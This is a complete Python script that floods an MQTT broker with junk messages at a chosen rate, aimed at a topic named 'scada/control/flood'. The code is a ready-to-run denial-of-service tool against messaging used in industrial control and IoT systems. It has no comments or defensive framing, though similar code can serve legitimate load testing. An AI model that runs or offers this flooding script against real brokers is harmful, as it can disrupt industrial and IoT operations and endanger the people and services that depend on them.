#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time
import sys
import random

TOPIC = "scada/control/flood"

if len(sys.argv) != 6:
    print(f"Usage: {sys.argv[0]} <BROKER_IP> <BROKER_PORT> <QOS> <PAYLOAD_SIZE> <RATE>")
    sys.exit(1)

try:
    BROKER_IP = sys.argv[1]
    BROKER_PORT = int(sys.argv[2])
    QOS = int(sys.argv[3])
    PAYLOAD_SIZE = int(sys.argv[4])
    RATE = int(sys.argv[5])
except ValueError as e:
    print(f"Error parsing arguments: {e}")
    sys.exit(1)

PAYLOAD = "X" * PAYLOAD_SIZE

def on_connect(client, userdata, flags, rc):
    if rc != 0:
        print(f"Connection failed with return code {rc}")
        sys.exit(1)
    else:
        print(f"Connected to {BROKER_IP}:{BROKER_PORT}")

def flood_publish():
    client_id = f"pub_flood_{int(time.time())}_{random.randint(100, 999)}"
    client = mqtt.Client(client_id=client_id, clean_session=True)
    client.on_connect = on_connect

    try:
        print(f"Connecting to MQTT broker {BROKER_IP}:{BROKER_PORT}...")
        client.connect(BROKER_IP, BROKER_PORT, keepalive=60)
        client.loop_start()
        time.sleep(1)
    except Exception as e:
        print(f"Connection error: {e}")
        sys.exit(1)

    target_ns = 1_000_000_000 / RATE
    get_time_ns = getattr(time, 'monotonic_ns', lambda: int(time.time() * 1e9))

    print(f"Starting flood: QoS={QOS}, Payload={PAYLOAD_SIZE}B, Rate={RATE}pps")
    print("Press Ctrl+C to stop")

    msg_count = 0
    start_time = time.time()
    
    try:
        
        while True:
            loop_start_ns = get_time_ns()

            client.publish(TOPIC, PAYLOAD, qos=QOS, retain=False)
            msg_count += 1

            if msg_count % 1000 == 0:
                elapsed = time.time() - start_time
                actual_rate = msg_count / elapsed if elapsed > 0 else 0
                print(f"Sent {msg_count} messages | Rate: {actual_rate:.1f} pps")

            loop_end_ns = get_time_ns()
            elapsed_ns = loop_end_ns - loop_start_ns
            sleep_ns = target_ns - elapsed_ns

            if sleep_ns > 0:
                time.sleep(sleep_ns / 1_000_000_000)

    except KeyboardInterrupt:
        print(f"\nStopping... Sent {msg_count} messages total")
        client.loop_stop()
        client.disconnect()
        sys.exit(0)

if __name__ == "__main__":
    flood_publish()
